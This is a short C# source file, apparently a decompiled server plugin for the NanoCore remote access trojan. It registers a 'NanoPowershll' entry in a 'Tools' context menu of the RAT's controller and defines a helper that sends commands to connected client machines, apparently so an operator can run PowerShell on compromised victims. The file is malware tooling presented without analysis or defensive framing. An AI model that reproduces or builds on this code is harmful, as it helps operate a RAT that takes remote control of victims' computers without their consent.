using NanoCore;
using NanoCore.ServerPluginHost;

namespace PowershellRunnerServer
{
	internal sealed class ServerMain
	{
		public static IServerNetworkHost NetworkHost;
		public static IServerUIHost UIHost;
		public static IServerLoggingHost LoggingHost;
		public static RunnerForm RunnerForm;

		public static void SendCommand(IClient client, params object[] @params)
		{
			NetworkHost.SendToClient(client, null, true, @params);
		}

		public static void InitializePlugin()
		{
			ContextEntry contextEntry = new ContextEntry
			{
				Name = "NanoPowershll",
				Icon = "powershell_manager",
				ClickedCallback = new ContextClickedDelegate(ContextCallbacks.HandlePowershellManagerClick)
			};
			ContextEntry contextEntry2 = new ContextEntry
			{
				Name = "Tools",
				Icon = "toolbox",
				Children = new ContextEntry[]
				{
					contextEntry
				}
			};
			UIHost.AddContextEntry(contextEntry2);
		}
	}
}